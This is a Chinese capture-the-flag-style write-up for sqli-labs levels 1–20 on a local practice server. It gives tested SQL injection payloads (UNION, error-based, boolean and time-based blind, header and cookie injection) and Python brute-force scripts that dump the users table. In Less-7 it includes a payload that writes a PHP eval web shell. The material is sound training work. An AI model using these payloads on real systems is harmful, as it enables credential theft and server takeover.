# sqli-labs Less-1 ~ Less-20 通关 Writeup

> 靶场：sqli-labs-master（本地授权环境）
> 环境：Windows 11 + phpStudy Pro（Apache 2.4.39 / PHP 5.2.17nts / MySQL 5.7.26）
> 入口：`http://localhost/sqli-labs-master/`
> 说明：本文所有 payload **均在本机实测通过**，输出为真实抓取结果。

---

## 目录

| 关卡 | 类型 | 闭合方式 | 一句话 |
|---|---|---|---|
| [Less-1](#less-1) | GET 报错型 | `'` | 最经典的字符型注入 |
| [Less-2](#less-2) | GET 报错型 | 无（数字型） | 不用闭合引号 |
| [Less-3](#less-3) | GET 报错型 | `')` | 引号外还套了括号 |
| [Less-4](#less-4) | GET 报错型 | `")` | 双引号 + 括号 |
| [Less-5](#less-5) | GET 报错盲注 | `'` | 不回显数据，用报错函数 |
| [Less-6](#less-6) | GET 报错盲注 | `"` | 同上，双引号闭合 |
| [Less-7](#less-7) | GET 导出文件 | `'))` | 本环境 outfile 被禁，改用盲注 |
| [Less-8](#less-8) | GET 布尔盲注 | `'` | 只看「You are in」在不在 |
| [Less-9](#less-9) | GET 时间盲注 | `'` | 只看响应时间 |
| [Less-10](#less-10) | GET 时间盲注 | `"` | 同上，双引号 |
| [Less-11](#less-11) | POST 报错型 | `'` | 登录框注入 |
| [Less-12](#less-12) | POST 报错型 | `")` | 登录框，双引号加括号 |
| [Less-13](#less-13) | POST 盲注 | `')` | 不显示数据，只给图片 |
| [Less-14](#less-14) | POST 盲注 | `"` | 同上 |
| [Less-15](#less-15) | POST 盲注 | `'` | 布尔 + 时间盲注 |
| [Less-16](#less-16) | POST 盲注 | `")` | 同上 |
| [Less-17](#less-17) | POST UPDATE 注入 | `'` | 改密码处注入 |
| [Less-18](#less-18) | 请求头注入 | `'` | User-Agent 写库 |
| [Less-19](#less-19) | 请求头注入 | `'` | Referer 写库 |
| [Less-20](#less-20) | Cookie 注入 | `'` | Cookie 里的 uname |

---

## 零、开打前必须掌握的 8 个知识点

### 1. 注释符

| 写法 | 说明 |
|---|---|
| `--+` | URL 里最常用。`+` 会被服务器解码成空格，等价于 `-- `（**注意 `--` 后面必须有空格**） |
| `#` | 也能注释，但在 URL 里必须写成 `%23`，否则被浏览器当成锚点丢掉 |
| `/* */` | 块注释，`/*` 单独用也能截断后面 |

### 2. 判断列数：ORDER BY

```sql
?id=1' order by 3--+     -- 正常
?id=1' order by 4--+     -- 报错 Unknown column '4' in 'order clause'
```
报错说明 3 是上限，即原查询有 **3 列**。

### 3. 判断回显位：UNION SELECT

`UNION` 要求前后列数一致。把 `id` 设成 `-1`（一个查不到的值），这样页面显示的就是我们 UNION 出来的那行。

```sql
?id=-1' union select 1,2,3--+
```
页面显示 `2` 和 `3`，说明第 2、3 列会被输出到页面上（第 1 列不显示）。

### 4. 两处「只取第一行」的关卡

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1     -- SQL 层只取 1 行
$row = mysql_fetch_array($result);               -- PHP 层只取 1 行
```
所以 UNION 出来的多行只会显示第一行 —— 这就是为什么大牛都用 `group_concat()` 把结果拼成一行。

### 5. 常用函数

| 函数 | 作用 | 示例结果 |
|---|---|---|
| `database()` | 当前库名 | `security` |
| `version()` | 数据库版本 | `5.7.26` |
| `user()` | 当前用户 | `root@localhost` |
| `@@datadir` | 数据目录 | `E:\phpstudy\...\data\` |
| `@@secure_file_priv` | 文件读写限制 | `NULL`（禁止） |
| `group_concat(a,0x3a,b)` | 多行拼一行，`0x3a` 是冒号 `:` | `admin:admin,...` |
| `concat(0x7e,x)` | 拼接，`0x7e` 是 `~`，方便定位 | `~security` |
| `substr(s,1,1)` | 截取 | `s` |
| `length(s)` | 长度 | `8` |
| `sleep(3)` | 延迟 3 秒 | — |
| `extractvalue(1,x)` | 报错注入，回显 `x` | `XPATH syntax error: '~security'` |
| `updatexml(1,x,1)` | 报错注入，回显 `x` | 同上 |

> ⚠️ `extractvalue` / `updatexml` 报错回显**最多 32 字节**，超出的部分会被截断。要拿完整数据得配合 `substr()` 分段取。
>
> ⚠️ **为什么一定要加 `0x7e`？** 两个原因：
> 1. 第二个参数（XPath）**必须是常量**，传列名会被拒：`Only constant XPATH queries are supported`
> 2. 它必须是一个**非法**的 XPath 才会报错。`concat(database())` 的结果是 `security`，
>    而 `security` 恰好是个**合法**的元素名 → 不报错、页面一片空白。
>    加上 `0x7e`（`~`）变成 `~security`，`~` 不是合法 XPath 字符 → 报错，数据就跟着吐出来了。

### 6. 判断页面「成功/失败」的信号

不同关卡的信号完全不一样，动手前先确认：

| 信号 | 出现在哪些关 |
|---|---|
| 直接显示 `Your Login name:` / `Your Password:` | 1、2、3、4、11、12、20 |
| 只显示 `You are in...........` | 5、6、7、8、9、10 |
| 图片 `flag.jpg`（成功）/ `slap.jpg`（失败） | 11、12、13、14、15、16、18、19 |
| 只有响应时间有差别 | 9、10、15、16 |

### 7. 本环境的 3 个特殊结论（重要）

1. **`@@secure_file_priv = NULL`** —— 表示 MySQL **完全禁止**文件导入导出。
   所以 **Less-7 的 `INTO OUTFILE` 写马在本环境走不通**（实测文件未生成），本文给出替代打法。
2. **`magic_quotes_gpc = Off`** —— 已确认关闭，注入的 `'` 不会被自动转义。
   如果发现所有 payload 都返回一样的结果，八成是这个开关被打开了，去 `php5.2.17nts\php.ini` 改成 `Off` 并重启服务。
3. **`admin` 的密码会被 Less-17 真的改掉** —— Less-17 本质是一条 `UPDATE` 语句，注入成功就是真的改了库。
   做完 17 关记得把密码改回来：`uname=admin&passwd=admin`。

### 8. 免责声明

以下技术**只能用于自己搭建的靶场、明确授权的渗透测试**。未经授权对他人系统使用属于违法行为。

---

## Less-1

**GET · 报错型 · 单引号字符型**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

### 判断闭合方式

先随便给个 `1`，再给个 `1'`：

```
?id=1     →  Your Login name:Dumb     Your Password:Dumb
?id=1'    →  You have an error in your SQL syntax ... near ''1'' LIMIT 0,1' at line 1
```

`1'` 报错说明单引号**没有被转义**，它闭合了原来那个 `'`，导致引号不配对。

### 闭合原理

```
原句：SELECT * FROM users WHERE id='$id' LIMIT 0,1
输入：1'
结果：SELECT * FROM users WHERE id='1'' LIMIT 0,1
                                  ↑ 多出一个引号，语法错误
```

只要把后面的东西注释掉就恢复正常：

```
输入：1' --+
结果：SELECT * FROM users WHERE id='1' --+ LIMIT 0,1
                                       ↑ 后面全被注释
```

### 通关 payload（实测）

**① 判断列数**
```
?id=1' order by 3--+     →  正常显示 Dumb
?id=1' order by 4--+     →  Unknown column '4' in 'order clause'
```
→ 3 列

**② 找显示位**
```
?id=-1' union select 1,2,3--+
```
实测输出：`user=2  pass=3` → 第 2、3 列会显示

**③ 拿库名和版本**
```
?id=-1' union select 1,database(),version()--+
```
实测输出：`user=security  pass=5.7.26`

**④ 一次拖出全部账号密码**
```
?id=-1' union select 1,2,group_concat(username,0x3a,password) from users--+
```
实测输出（13 条）：

```
Dumb:Dumb, Angelina:I-kill-you, Dummy:p@ssword, secure:crappy,
stupid:stupidity, superman:genious, batman:mob!le, admin:admin,
admin1:admin1, admin2:admin2, admin3:admin3, dhakkan:dumbo, admin4:admin4
```

### 遇到查不到表名怎么办

`information_schema` 是 MySQL 自带的元数据库，但里面有几百个无关的库。用 `table_schema=database()` 过滤：

```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
→ emails,referers,uagents,users

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+
→ id,username,password
```
> `0x7573657273` 是 `users` 的十六进制写法。用十六进制是为了绕开引号，属于习惯操作。

---

## Less-2

**GET · 报错型 · 数字型**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";   // 注意：$id 外面没有引号
```

### 与 Less-1 的唯一区别

`$id` 没有被引号包裹，所以**不需要闭合任何符号**，直接拼接 SQL 片段即可。

```
?id=1     →  正常
?id=1'    →  报错（因为多了个孤立的引号）near ''1'' LIMIT 0,1'
```

> 这关是个常见陷阱：很多人看到报错就习惯性加 `'`，其实这里 `'` 是**多余的**。

### 通关 payload（实测）

```
?id=-1 union select 1,2,3--+               →  user=2  pass=3
?id=-1 union select 1,database(),version()--+  →  user=security  pass=5.7.26
?id=-1 union select 1,2,group_concat(username,0x3a,password) from users--+
```

---

## Less-3

**GET · 报错型 · 单引号 + 括号**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
                                ↑        ↑
                              多了括号
```

### 判断闭合方式

```
?id=1'    →  报错 near ''1'') LIMIT 0,1'
```
从报错信息里能直接看到剩下的 `')`，这就是提示。所以闭合要用 **`')`**：

```
输入：1') --+
结果：SELECT * FROM users WHERE id=('1') --+ LIMIT 0,1
```

### 通关 payload（实测）

```
?id=1') --+                       →  user=Dumb  pass=Dumb
?id=-1') union select 1,2,3--+    →  user=2  pass=3
?id=-1') union select 1,database(),version()--+  →  user=security  pass=5.7.26
```

> 💡 **技巧**：报错信息里 `near` 后面那一小段，就是告诉你「还差什么闭合」的最好提示。

---

## Less-4

**GET · 报错型 · 双引号 + 括号**

### 源码

```php
$id = $_GET['id'];
$id = '"' . $id . '"';                                  // 先给你的输入套一层双引号
$sql = "SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

### 关键点：这关的引号是 PHP 加的

因为有一行 `$id = '"' . $id . '"';`，所以最终 SQL 是 `id=("1")` 这种形式。
闭合需要 **`")`**，且顺序是「先双引号、后括号」。

```
?id=1"    →  报错 near '"1"") LIMIT 0,1'
             ↑ 注意这里有两个双引号：一个是你输的，一个是 PHP 补的
?id=1") --+   →  正常返回 Dumb
```

### 通关 payload（实测）

```
?id=1") --+                        →  user=Dumb  pass=Dumb
?id=-1") union select 1,2,3--+     →  user=2  pass=3
?id=-1") union select 1,database(),version()--+  →  user=security  pass=5.7.26
```

---

## Less-5

**GET · 报错型盲注（双注入）· 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }   // 只输出这句话！
else     { echo mysql_error(); }             // 失败时输出报错
```

### 特点：不回显数据

用 UNION 试试就知道，页面永远只有 `You are in...........`：

```
?id=-1' union select 1,2,3--+     →  You are in...........（看不到 1,2,3）
```

因为 PHP 里根本没写 `echo $row['username']`。既然**显示位没了**，就改用**报错位**——把数据塞进报错信息里。

### 通关 payload（实测）

`extractvalue()` / `updatexml()` 的第二个参数必须是合法的 XPath，我们故意传 `~security` 这种非法值，MySQL 就会把这段内容当成错误抛出来：

```
?id=1' and extractvalue(1,concat(0x7e,database()))--+
→ XPATH syntax error: '~security'
```

取版本、用户名同理。整表拖库：

```
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1)--+
→ XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'
```

> ⚠️ 只显示了 `D` 就断了，因为 **updatexml 报错最多输出 32 字节**。要完整数据用 `substr()` 分段：
> ```
> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)),1)--+
> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),31,30)),1)--+
> ```
> 每次往后挪 30 个字符，直到取完。

---

## Less-6

**GET · 报错型盲注 · 双引号**

### 源码

```php
$id = $_GET['id'];
$id = '"' . $id . '"';                               // 套双引号
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

结构上等于 Less-5 换成双引号版。闭合用 **`"`**。

### 通关 payload（实测）

```
?id=1"                          →  报错 near '"1"" LIMIT 0,1'
?id=1" --+                      →  You are in...........
?id=-1" union select 1,2,3--+   →  You are in...........（依旧不回显）
?id=1" and extractvalue(1,concat(0x7e,database()))--+
→ XPATH syntax error: '~security'
```

---

## Less-7

**GET · 导出文件 · 单引号 + 双括号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
                                   ↑↑        ↑↑
                                 两层括号
if($row) { echo 'You are in.... Use outfile......'; }
else     { echo 'You have an error in your SQL syntax'; }   // ← 这是假的报错，别被骗
```

### 判断闭合方式

```
?id=1'      →  You have an error in your SQL syntax
?id=1')) --+ →  You are in.... Use outfile......
```
闭合是 **`'))`**（两个右括号 + 一个引号）。

### ⚠️ 这关原本是写文件，但本环境写不了

原版思路是把一句话木马 `INTO OUTFILE` 写到网站目录：

```
?id=-1')) union select 1,2,'<?php @eval($_POST[1]);?>' into outfile 'E:/phpstudy/phpstudy_pro/WWW/sqli-labs-master/shell.php'--+
```

**实测：文件没有生成。** 原因是本环境 `@@secure_file_priv = NULL`：

```
?id=-1' union select 1,@@secure_file_priv,@@datadir--+
→  user=NULL   pass=E:\phpstudy\phpstudy_pro\Extensions\MySQL5.7.26\data\
```

`secure_file_priv` 的三种取值：

| 值 | 含义 |
|---|---|
| `NULL` | **完全禁止**文件导入导出 ← 本环境 |
| 空字符串 | 允许任意路径（最危险） |
| 某个目录 | 只允许该目录 |

想要开启，改 `my.ini` 里的 `secure_file_priv`（留空或写目录），重启 MySQL 即可。**但日常用不到就别开**，这是很重要的安全配置。

### 替代打法：当布尔盲注用（实测有效）

既然 `else` 分支会输出一句假报错，那就用它当真/假信号：

```
?id=1')) and length(database())=8--+   →  You are in.... （真）
?id=1')) and length(database())=9--+   →  You have an error in your SQL syntax （假）
```
→ 库名长度 = 8（`security`）

接着逐字符爆破：

```
?id=1')) and substr(database(),1,1)='s'--+
?id=1')) and ascii(substr(database(),1,1))=115--+
```

---

## Less-8

**GET · 布尔盲注 · 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { /* 什么都不输出 */ }
```

### 特点

页面只有两种状态：
- 条件为真 → 出现 `You are in...........`
- 条件为假 → 那句话消失

没有回显位，也没有报错，只能靠「有没有这句话」来判断。这叫**布尔盲注**。

### 通关 payload（实测）

**① 确认布尔条件生效**
```
?id=1' and 1=1--+   →  You are in...........
?id=1' and 1=2--+   →  （无）
```

**② 猜库名长度**
```
?id=1' and length(database())=8--+   →  You are in...........   ✓ 长度是 8
```

**③ 逐字符猜库名**
```
?id=1' and substr(database(),1,1)='s'--+        →  有回显  ✓
?id=1' and ascii(substr(database(),1,1))=115--+ →  有回显  ✓
```

**④ 完整爆破解法**

手工猜 8 个字符还能忍，猜 13 个用户的密码就不可能手搓了。写脚本自动跑：

```python
import requests

url = "http://localhost/sqli-labs-master/Less-8/"
chars = "abcdefghijklmnopqrstuvwxyz0123456789@._-"
result = ""

for pos in range(1, 30):
    for ch in chars:
        payload = f"?id=1' and substr(database(),{pos},1)='{ch}'--+"
        r = requests.get(url + payload)
        if "You are in" in r.text:
            result += ch
            print(result)
            break
    else:
        break          # 整个字符集都没匹配上 → 字符串结束了
print("结果:", result)
```

把这行换成 `(select group_concat(username,0x3a,password) from users)` 就能拖库。

---

## Less-9

**GET · 时间盲注 · 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { echo 'You are in...........'; }   // ← 注意！两个分支输出一样
```

### 特点：连布尔信号都没了

不管真假，页面都显示 `You are in...........`。这时只能靠 **`sleep()` 让数据库睡一会儿**，通过**响应时间**判断真假。

### 通关 payload（实测）

```
?id=1' and 1=1--+      →   259ms   （快）
?id=1' and sleep(3)--+ →  3260ms   （慢了 3 秒 → 注入成功）
```

### 时间盲注的完整套路

```python
import requests, time

url = "http://localhost/sqli-labs-master/Less-9/"
chars = "abcdefghijklmnopqrstuvwxyz0123456789@._-"
result = ""

for pos in range(1, 30):
    for ch in chars:
        payload = f"?id=1' and if(substr(database(),{pos},1)='{ch}',sleep(2),0)--+"
        t = time.time()
        requests.get(url + payload)
        if time.time() - t > 1.8:      # 真的睡了 2 秒
            result += ch
            print(result)
            break
    else:
        break
print("结果:", result)
```

> 💡 `if(条件, 真时执行, 假时执行)` 是 MySQL 的三元运算符，时间盲注的标配。
> ⚠️ 时间盲注**非常慢**，一次请求 2 秒，猜一个字符最多要 36×2 秒。实际渗透中只在万不得已时用。

---

## Less-10

**GET · 时间盲注 · 双引号**

### 源码

```php
$id = '"' . $id . '"';
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { echo 'You are in...........'; }
```

Less-9 的双引号版，闭合用 **`"`**。

### 通关 payload（实测）

```
?id=1" and 1=1--+      →   250ms
?id=1" and sleep(3)--+ →  3271ms   ✓ 注入成功
```

---

## Less-11

**POST · 报错型 · 单引号**

### 源码

```php
$uname  = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

### 特点：从 URL 转到了表单

第一关开始都是 GET，从这关开始变成 POST。用 curl 或 Burp 提交：

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-11/" \
     --data-raw "uname=admin%27+--+&passwd=x"
```

> ⚠️ 两个坑：
> 1. **不能用 `--data-urlencode`** —— 它会把 `+` 编码成 `%2B`，`--+` 就失效了。要用 `--data-raw` 自己控制编码。
> 2. 空格要编码成 `+`，单引号写成 `%27`。上面这条 payload 解码后正好是 `admin' -- `。
>
> 嫌麻烦就用 **Burp Suite** 抓包改，或者浏览器 F12 → 网络 → 右键请求 → 编辑并重发。

### 闭合原理

```
原句：... WHERE username='$uname' and password='$passwd' LIMIT 0,1
输入 uname = admin' --+
结果：... WHERE username='admin' --+ and password='...' LIMIT 0,1
                                  ↑ 密码校验被注释掉了！
```

这就是最经典的**万能密码**：不需要知道密码，直接把密码判断注释掉。

### 通关 payload（实测）

**① 万能密码登录**
```
uname = admin' --+
passwd = 随便填
→ 成功  user=admin  pass=admin
```

**② UNION 查库名**
```
uname = -1' union select 1,database()--+
passwd = x
→ 页面显示  user=1  pass=security
```

**③ 拖库**
```
uname = -1' union select 1,group_concat(username,0x3a,password) from users--+
passwd = x
→  13 条账号密码全部显示在用户名/密码位置
```

---

## Less-12

**POST · 报错型 · 双引号 + 括号**

### 源码

```php
$uname  = $_POST['uname'];
$passwd = $_POST['passwd'];
$uname  = '"' . $uname  . '"';      // 套双引号
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

和 Less-4 一个套路（双引号 + 括号），闭合用 **`")`**。

### 通关 payload（实测）

```
uname = admin") --+            →  成功  user=admin  pass=admin
uname = -1") union select 1,group_concat(username,0x3a,password) from users--+
→  13 条账号密码全部拖出
```

---

## Less-13

**POST · 盲注 · 单引号 + 括号**

### 源码

```php
$sql = "SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
if($row) {
    //echo 'Your Login name:'. $row['username'];   ← 被注释了！
    //echo 'Your Password:' .$row['password'];     ← 被注释了！
    echo '<img src="../images/flag.jpg" />';       // 成功 → 旗子图
} else {
    print_r(mysql_error());
    echo '<img src="../images/slap.jpg" />';       // 失败 → 巴掌图
}
```

### 特点：数据回显被注释掉了

源码里 `echo $row['username']` 全被 `//` 注释了，只留下一张图片。
所以 UNION 也能让页面变成"成功"，但**看不到数据**：

```
uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
```

要拿数据只能走**布尔盲注**。

### 通关 payload（实测）

**闭合确认**
```
uname = admin') --+   →  flag.jpg   ✓
```

**布尔盲注（实测）**
```
uname = admin') and length(database())=8--+   →  flag.jpg  （真）
uname = admin') and length(database())=9--+   →  slap.jpg  （假）
```
→ 库名长度 = 8

判断标准：页面里出现 `flag.jpg` 即为真，出现 `slap.jpg` 即为假。

---

## Less-14

**POST · 盲注 · 双引号**

### 源码

```php
$uname  = '"' . $uname  . '"';
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
```

闭合用 **`"`**（注意这里没有括号）。

### 通关 payload（实测）

```
uname = admin" --+                            →  flag.jpg
uname = admin" and length(database())=8--+    →  flag.jpg  （真）
uname = admin" and length(database())=9--+    →  slap.jpg  （假）
```

---

## Less-15

**POST · 布尔/时间盲注 · 单引号**

### 源码

```php
$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
if($row) { echo '<img src="../images/flag.jpg" />'; }
else     { echo '<img src="../images/slap.jpg" />'; }
```

结构跟 Less-11 一模一样，区别还是**回显被注释掉了**。

### 通关 payload（实测）

**布尔盲注**
```
uname = admin' --+                            →  flag.jpg
uname = admin' and 1=2--+                     →  slap.jpg
uname = admin' and length(database())=8--+    →  flag.jpg  （真）
uname = admin' and length(database())=9--+    →  slap.jpg  （假）
```

**时间盲注**
```
uname = admin' and sleep(3)--+   →  3280ms（正常 240ms）✓ 注入成功
```

---

## Less-16

**POST · 布尔/时间盲注 · 双引号 + 括号**

### 源码

```php
$uname  = '"' . $uname  . '"';
$passwd = '"' . $passwd . '"';
$sql = "SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

闭合用 **`")`**。

### 通关 payload（实测）

```
uname = admin") --+                          →  flag.jpg
uname = admin") and 1=2--+                   →  slap.jpg
uname = admin") and length(database())=8--+  →  flag.jpg  （真）
```

---

## Less-17

**POST · UPDATE 语句注入 · 单引号**

### 源码

```php
// 用户名经过了 check_input() 过滤，安全
$uname  = check_input($_POST['uname']);
$passwd = $_POST['passwd'];          // ← 密码没过滤！

$sql = "SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
$row1 = mysql_fetch_array($result);

$update = "UPDATE users SET password = '$passwd' WHERE username='$row1'";
mysql_query($update);
```

### 这关的两个特殊点

**① 注入点在「新密码」框，不在用户名框**

`check_input()` 干了三件事：
```php
$value = substr($value, 0, 15);                       // 截断到 15 字符
if (get_magic_quotes_gpc()) stripslashes($value);     // 处理魔术引号
if (!ctype_digit($value))                             // 非纯数字就用它转义并加引号
    $value = "'" . mysql_real_escape_string($value) . "'";
```
`mysql_real_escape_string()` 会把 `'` 转义成 `\'`，所以**用户名框打不进去**。
但 `$passwd` 是原样拼进 SQL 的 —— 突破口在密码框。

**② 这关会真的改数据库**

它是 `UPDATE` 语句，注入成功 = 真的执行了修改。**做完记得把密码改回去**：
```
uname = admin
passwd = admin        （正常提交，把 admin 的密码重置回 admin）
```

### 通关 payload（实测）

用户名必须填一个**真实存在**的用户（否则 `$row1` 为空，后面 UPDATE 不执行）。

**① 报错注入拿库名**
```
uname  = admin
passwd = ' or updatexml(1,concat(0x7e,database()),1) or '
→  XPATH syntax error: '~security'   ✓
```

**② 拿版本**
```
passwd = ' or updatexml(1,concat(0x7e,version()),1) or '
→  XPATH syntax error: '~5.7.26'   ✓
```

**③ 拖库时的坑：MySQL 1093 错误**

直接子查询 `users` 表会失败：
```
passwd = ' or updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) or '
→  失败（MySQL 不允许在 UPDATE 某表时子查询同一张表）
```

**解决办法：套一层派生表**（`select * from (...) x`），让 MySQL 先把子查询物化成临时表：

```
passwd = ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
→  XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'   ✓ 成功！
```

> 💡 这个派生表绕过的技巧很实用，遇到 `ERROR 1093` 就用它。

**④ `and` 还是 `or`？—— 实测两个都能用**

| payload | 实测结果 |
|---|---|
| `' or updatexml(1,concat(0x7e,database()),1) or '` | `XPATH syntax error: '~security'` ✓ |
| `' and updatexml(1,concat(0x7e,database()),1) and '` | `XPATH syntax error: '~security'` ✓ |

两个都成功。原因是 **`updatexml()` 的 XPath 参数必须是常量**，传列名进去会被 MySQL 直接拒绝：

```
?id=1' and updatexml(1,concat(0x7e,username),1)--+
→ Only constant XPATH queries are supported
```

既然是常量，MySQL 在**优化阶段就把它算掉了**，而优化发生在 WHERE 求值**之前**。
所以 `and` 左边是真是假，都不影响报错触发。

> ⚠️ 但**别以为 `and` 永远安全** —— 短路求值本身是真实存在的，只是管不到常量表达式：

| 测试 | 耗时 | 说明 |
|---|---|---|
| `?id=1' and sleep(3)--+` | 3.24s | 左边为真 → 右边执行 |
| `?id=-1' and sleep(3)--+` | 0.22s | 左边为假 → **右边被短路，根本没执行** |

`sleep()` 不是常量、折叠不掉，所以老老实实遵守短路规则。

**真正的规则**：
- 报错函数里放**常量**（`database()` / `version()` / 子查询）→ 优化期就被折叠，`and`、`or` 都行
- 放**折叠不掉**的东西（`sleep()`、依赖行的表达式）→ 左边为假时 `and` 会失效，这时必须用 `or`

---

## Less-18

**请求头注入 · User-Agent**

### 源码

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];        // ← 取 User-Agent，完全没有过滤
$uname  = check_input($_POST['uname']);
$passwd = check_input($_POST['passwd']);

$sql = "SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
$row1 = mysql_fetch_array($result1);

if($row1) {                                   // ← 必须先登录成功
    $insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
    mysql_query($insert);
    echo 'Your User Agent is: ' .$uagent;
    print_r(mysql_error());                   // ← 报错在这里回显
    echo '<img src="../images/flag.jpg"  />';
}
```

### 特点

- `uname` / `passwd` 都被 `check_input()` 过滤了，**打不进去**
- `User-Agent` 头**原样拼进 INSERT 语句**，是注入点
- **必须先正常登录成功**（`admin` / `admin`），否则根本不会执行 INSERT

### 通关 payload（实测）

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-18/" \
     -d "uname=admin&passwd=admin&submit=submit" \
     -H "User-Agent: ' or updatexml(1,concat(0x7e,database()),1) or '"
```

**实测结果**：`flag.jpg` + `XPATH syntax error: '~security'` ✓

**验证注入确实存在**（故意制造语法错误）：
```
User-Agent: a'
→  You have an error in your SQL syntax ... near '127.0.0.1', 'admin')' at line 1
   从报错里能直接看到 INSERT 语句的结构
```

**拖库**（同样要用派生表绕 1093）：
```
User-Agent: ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
→  XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'   ✓
```

> 💡 用 Burp Suite 更方便：抓包 → 改 User-Agent → Forward。

---

## Less-19

**请求头注入 · Referer**

### 源码

```php
$uagent = $_SERVER['HTTP_REFERER'];           // ← 注入点换成了 Referer

$insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
mysql_query($insert);
```

跟 Less-18 完全同构，只是把注入点从 `User-Agent` 换成了 `Referer`，写入的表也从 `uagents` 换成 `referers`。

### 通关 payload（实测）

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-19/" \
     -d "uname=admin&passwd=admin&submit=submit" \
     -H "Referer: ' or updatexml(1,concat(0x7e,database()),1) or '"
```

**实测结果**：`flag.jpg` + `XPATH syntax error: '~security'` ✓

制造语法错误验证：
```
Referer: http://x'
→  near '127.0.0.1')' at line 1
```

拖库：
```
Referer: ' or updatexml(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) x)),1) or '
```

> 💡 **为什么这两关的闭合是 `' or ... or '` 而不是 `' --+`？**
> 因为 `INSERT` 是**单行语句**，后面没有 `LIMIT 0,1` 可以注释掉，而且 VALUES 的括号必须配平。
> 所以要用 `or '...'` 把尾部那个引号「借」回来，让语法重新合法。

---

## Less-20

**Cookie 注入 · uname**

### 源码

```php
// 第一次登录成功后，把用户名写进 Cookie
$cookee = $row1['username'];
setcookie('uname', $cookee, time()+3600);

// 之后每次访问，都会拿 Cookie 去查库 —— 而这里完全没有过滤！
if(!isset($_POST['submit'])) {
    $cookee = $_COOKIE['uname'];
    echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);
    $sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
    $result = mysql_query($sql);
    if (!$result) { die('Issue with your mysql: ' . mysql_error()); }   // ← 报错回显
    $row = mysql_fetch_array($result);
    if($row) {
        echo 'Your Login name:'. $row['username'];    // ← 数据回显！
        echo 'Your Password:' .$row['password'];
        echo 'Your ID:' .$row['id'];
    } else {
        echo '<img src="../images/slap1.jpg" />';
    }
}
```

### 特点

- 注入点在 **Cookie 的 `uname` 字段**
- 这关**既有数据回显、又有报错回显**，比 18/19 好打
- Cookie 值会被 PHP 自动 URL 解码，所以 `+` 依然等于空格

### 通关 payload（实测）

先正常登录拿到 Cookie（`admin` / `admin`），然后直接改 Cookie 重放。

**① 正常情况**
```
Cookie: uname=admin
→  user=admin  pass=admin  id=8
```

**② UNION 注入（实测有效）**
```
Cookie: uname=-1' union select 1,2,3--+
→  user=2  pass=3  id=1
```
> `-1'` 让原查询查空，页面就显示我们 UNION 出来的那行。

**③ 一次拖库**
```
Cookie: uname=-1' union select 1,2,group_concat(username,0x3a,password) from users--+
→  user=2
   pass=Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,
        stupid:stupidity,superman:genious,batman:mob!le,admin:admin,
        admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
   id=1
```
✓ 13 条全部拿到

**④ 报错注入（也可以）**
```
Cookie: uname=' or updatexml(1,concat(0x7e,database()),1) or '
→  Issue with your mysql: XPATH syntax error: '~security'
```

### 用浏览器怎么测

1. F12 → **Application（应用）** → 左侧 **Cookies** → 选中站点
2. 找到 `uname`，双击值改成 payload
3. 刷新页面（注意：改完 Cookie 后要**直接刷新**，不要再点提交按钮，否则会走 POST 分支重置 Cookie）

---

## 附录 A：20 关闭合方式速查

